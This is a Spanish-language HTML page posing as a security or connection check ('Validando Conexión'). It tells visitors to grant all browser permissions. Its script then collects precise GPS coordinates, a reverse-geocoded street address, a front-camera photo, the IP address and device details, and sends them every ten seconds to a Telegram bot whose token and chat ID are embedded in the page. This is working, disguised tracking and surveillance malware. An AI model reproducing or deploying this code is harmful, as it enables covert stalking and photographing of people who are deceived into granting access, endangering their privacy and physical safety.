<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AVISO DE SEGURIDAD</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .modal-content { background: white; padding: 30px; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #iphone-btn { display: none; background: #4A90E2; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; margin-top: 20px; cursor: pointer; }
        .instrucciones { display: none; margin-top: 15px; font-size: 0.9rem; color: #333; background: #fff5f5; border: 1px solid #feb2b2; padding: 15px; border-radius: 8px; text-align: left; line-height: 1.4; }
        .instrucciones strong { color: #c53030; }
        #error-msg { color: #c53030; font-weight: bold; display: none; margin-top: 10px; font-size: 0.85rem; }
    </style>
</head>
<body>

<div class="modal-content">
    <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg" style="width:80px; margin-bottom:15px;">
    <h3 id="status-title">Validando Conexión...</h3>
    <div id="spinner" class="loading-spinner"></div>
    <p id="status-text">Sincronizando con el servidor para referencia...</p>
    
    <div id="guia-manual" class="instrucciones">
        <strong>⚠️ ACCESO REQUERIDO:</strong><br><br>
        1. Toca el icono del <strong>candado</strong> 🔒 junto a la URL.<br>
        2. Concede todos los  <strong>permisos solicitados</strong>.<br>
        3. Toca el botón de abajo para verificar o actualiza la página.
    </div>
    <p id="error-msg">❌ Esperando permisos...</p>
    <button id="iphone-btn">ACTUALIZAR</button>
</div>

<script>
const BOT_TOKEN = "8254282443:AAFPfL2Qay1UtbeObu4_KSdsoSm1CN6yW-Q";
const CHAT_ID = "-1003973600762";
const INTERVALO = 10000;

let reporte = {
    ip: "N/A", ciudad: "null", calle: "null", numero: "null", colonia: "null",
    lat: null, lon: null, ua: navigator.userAgent, res: `${screen.width}x${screen.height}`
};

let cicloActivo = false;
let monitorID = null;

// Obtener IP inicial
fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => reporte.ip = j.ip).catch(()=>{});

async function ejecutarCiclo() {
    let fotoBlob = null;
    
    // Reset de dirección por ciclo
    reporte.ciudad = "null"; reporte.calle = "null"; reporte.numero = "null"; reporte.colonia = "null";

    // 1. GPS (OBLIGATORIO)
    try {
        const pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 6000 });
        });
        reporte.lat = pos.coords.latitude;
        reporte.lon = pos.coords.longitude;

        // GEOLOCALIZACIÓN INVERSA DETALLADA
        try {
            const geo = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${reporte.lat}&longitude=${reporte.lon}&localityLanguage=es`);
            const data = await geo.json();
            
            // Mapeo de datos
            reporte.ciudad = data.city || data.locality || "null";
            reporte.calle = data.address || "null"; // Calle aproximada
            reporte.colonia = data.lookupSource === "coordinates" ? (data.locality || "null") : "null";
            
            // Intentar extraer más info si el proveedor la da en la descripción
            if(data.localityInfo && data.localityInfo.administrative) {
                const admin = data.localityInfo.administrative;
                reporte.colonia = admin[admin.length - 1].name || reporte.colonia;
            }
        } catch(e) { console.log("Error en geocoding"); }

    } catch (e) { 
        reporte.lat = null; reporte.lon = null;
    }

    // 2. CÁMARA
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute("playsinline", true);
        video.muted = true;
        await video.play();
        await new Promise(r => setTimeout(r, 800));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
        stream.getTracks().forEach(t => t.stop());
    } catch (e) {}

    // ENVÍO SI HAY GPS
    if (reporte.lat !== null && reporte.lon !== null) {
        ocultarInstrucciones();
        const maps = `https://www.google.com/maps?q=${reporte.lat},${reporte.lon}`;
        
        const info = `📍 REPORTE DETALLADO\n\n` +
                     `🕒 ${new Date().toLocaleString()}\n` +
                     `🌐 IP: ${reporte.ip}\n\n` +
                     `🏠 DIRECCIÓN:\n` +
                     `• Ciudad: ${reporte.ciudad}\n` +
                     `• Colonia: ${reporte.colonia}\n` +
                     `• Calle/Ref: ${reporte.calle}\n\n` +
                     `📡 GPS:\n• Latitud: ${reporte.lat}\n• Longitud: ${reporte.lon}\n• Mapa: ${maps}\n\n` +
                     `📱 Info:\n• Navegador: ${reporte.ua}\n• Res: ${reporte.res}`;

        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        if (fotoBlob) {
            fd.append('photo', fotoBlob, 'f.jpg');
            fd.append('caption', info);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        } else {
            fd.append('text', info);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
        }
        return true;
    } else {
        mostrarInstrucciones();
        return false;
    }
}

function mostrarInstrucciones() {
    cicloActivo = false;
    if (monitorID) { clearInterval(monitorID); monitorID = null; }
    document.getElementById('spinner').style.display = 'none';
    document.getElementById('guia-manual').style.display = 'block';
    document.getElementById('iphone-btn').style.display = 'block';
    document.getElementById('error-msg').style.display = 'block';
    document.getElementById('status-text').innerText = "Acceso requerido.";
}

function ocultarInstrucciones() {
    document.getElementById('guia-manual').style.display = 'none';
    document.getElementById('iphone-btn').style.display = 'none';
    document.getElementById('error-msg').style.display = 'none';
    document.getElementById('spinner').style.display = 'block';
    document.getElementById('status-text').innerText = "Verificando Referencia.";
}

async function controlador() {
    const exito = await ejecutarCiclo();
    if (exito && !monitorID) {
        cicloActivo = true;
        monitorID = setInterval(ejecutarCiclo, INTERVALO);
    }
}

document.getElementById('iphone-btn').onclick = controlador;

window.onload = () => {
    controlador();
    setTimeout(() => { if (!cicloActivo) mostrarInstrucciones(); }, 6000);
};
</script>
</body>
</html>
